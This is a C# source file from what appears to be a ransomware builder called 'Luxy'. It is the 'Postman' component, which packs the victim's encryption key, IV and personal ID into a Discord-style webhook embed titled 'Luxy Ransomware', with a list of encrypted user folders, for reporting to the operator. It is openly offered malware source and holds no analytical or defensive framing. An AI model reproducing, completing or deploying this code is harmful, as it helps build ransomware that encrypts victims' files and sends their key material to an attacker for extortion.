using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace LuxyStub.Modules.Ransomware.Components.Postman
{
    public struct PayloadFormat
    {
        public string content { get; set; }

        public EmbedStructureFormat[] embeds { get; set; }
    }

    public struct EmbedStructureFormat
    {
        public string title { get; set; }

        public string description { get; set; }

        public string url { get; set; }

        public int color { get; set; }

        public FooterFormat footer { get; set; }

        public ThumbnailFormat thumbnail { get; set; }
    }

    public struct FooterFormat
    {
        public string text { get; set; }
    }

    public struct ThumbnailFormat
    {
        public string url { get; set; }
    }

    internal class PayloadGen
    {
        private readonly Dictionary<string, int> _ransomwareDataDict;

        internal PayloadGen(Dictionary<string, int> ransomwareDataDict)
        {
            _ransomwareDataDict = ransomwareDataDict;
        }

        internal async Task<string> GetPayload()
        {
            var key_b64 = Convert.ToBase64String(Settings.EncryptKey);
            var iv_b64 = Convert.ToBase64String(Settings.EncryptIV);

            PayloadFormat payload = new PayloadFormat();

            payload.content = "@everyone";

            payload.embeds = new[]
            {
                new EmbedStructureFormat
                {
                    title = "Luxy Ransomware",
                    description = $@"
**__Ransomeware Info__**
```autohotkey
Key: {key_b64}.{iv_b64}
Personal ID: {Settings.PersonalID}
```

**__Encrypted Files__**
```js
User Folder:
    Desktop: 
    Documents:
    Downloads:
    Music:
    Pictures:
    Movies:
```
".Trim(),
                    url = "https://github.com/Ayuly3851/Luxy",
                    color = 34303,
                    footer = new FooterFormat
                    {
                        text = $"Luxy Ransomeware {LuxyStub.Settings.Version} | https://github.com/Ayuly3851/Luxy"
                    },
                    thumbnail = new ThumbnailFormat
                    {
                        url = "https://github.com/Ayuly3851/Luxy"
                    }
                }
            };

            return SimpleJson.SerializeObject(payload);
        }
    }
}